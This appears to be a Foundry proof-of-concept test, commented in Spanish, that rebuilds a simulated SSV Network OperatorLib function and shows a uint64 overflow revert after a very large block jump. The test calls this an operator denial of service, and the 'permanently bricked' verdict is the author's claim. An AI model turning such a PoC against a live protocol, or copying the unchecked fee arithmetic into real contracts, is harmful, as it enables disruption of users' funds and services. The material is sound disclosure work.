// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

// Interfaces simuladas de SSV Network relevantes para el PoC
interface ISSVNetworkCore {
    struct Snapshot {
        uint32 block;
        uint64 index;
        uint64 balance;
    }

    struct Operator {
        address owner;
        uint64 fee;
        uint32 validatorCount;
        bool active;
        bool whitelisted;
        Snapshot snapshot;
    }

    // Errores estándar de Solidity
    error Panic(uint256 code);
}

// Simulamos la librería OperatorLib solo con la función vulnerable (línea 14-20)
library OperatorLib {
    function updateSnapshot(ISSVNetworkCore.Operator memory operator) internal view {
        // VULNERABILIDAD AQUÍ: uint32() - operator.snapshot.block puede dar un salto grande
        // si el snapshot no se actualiza. Multiplicado por operator.fee (ambos evaluados en uint64).
        // Si el salto * fee > max uint64, hace overflow y revierte bajo Solidity 0.8.
        uint64 blockDiffFee = (uint32(block.number) - operator.snapshot.block) * operator.fee;

        operator.snapshot.index += blockDiffFee;
        operator.snapshot.balance += blockDiffFee * operator.validatorCount;
        operator.snapshot.block = uint32(block.number);
    }
}

contract SSVOperatorFeeOverflowPoC is Test {
    using OperatorLib for ISSVNetworkCore.Operator;

    ISSVNetworkCore.Operator targetOperator;

    function setUp() public {
        // Configuramos al operador en el bloque actual
        targetOperator = ISSVNetworkCore.Operator({
            owner: address(this),
            fee: type(uint64).max / 1_000_000_000, // Fee alto, pero individualmente legal
            validatorCount: 10,
            active: true,
            whitelisted: true,
            snapshot: ISSVNetworkCore.Snapshot({
                block: uint32(block.number),
                index: 0,
                balance: 0
            })
        });
    }

    function test_operatorFeeOverflowDoS() public {
        console.log("=== SSV Network (OperatorLib) - Operator DoS PoC ===");
        
        // Bloque de inicio simulado
        uint256 startBlock = block.number;
        console.log("Current Block:", startBlock);
        console.log("Operator Fee configured:", targetOperator.fee);
        
        // El operador no recibe actualizaciones (por falta de registro de validadores o actividad).
        // Avanzamos el tiempo (años/décadas simuladas)
        uint256 blocksPassed = 1_500_000_000;
        vm.roll(startBlock + blocksPassed);
        
        console.log("Rolling forward by %s blocks...", blocksPassed);
        console.log("New block.number:", block.number);
        
        // Un usuario intenta registrar un validador en un clúster que incluye a este operador.
        // La transacción internamente llama a: OperatorLib.updateSnapshot()
        // El cálculo será: (1,500,000,000 * (type(uint64).max / 1,000,000_000))
        // Esto excederá type(uint64).max (1.8 * 10^19) y causará REVERT silenciado (DoS).
        
        // Capturamos la expectativa de revertir por pánico aritmético
        vm.expectRevert(abi.encodeWithSelector(ISSVNetworkCore.Panic.selector, 0x11));
        
        // Ejecutamos la función vulnerable.
        OperatorLib.updateSnapshot(targetOperator);

        console.log("SUCCESS: Transaction reverted. Operator is permanently bricked (DoS).");
        console.log("Reason: uint64 Arithmetic Overflow on blockDiffFee calculation.");
    }
}
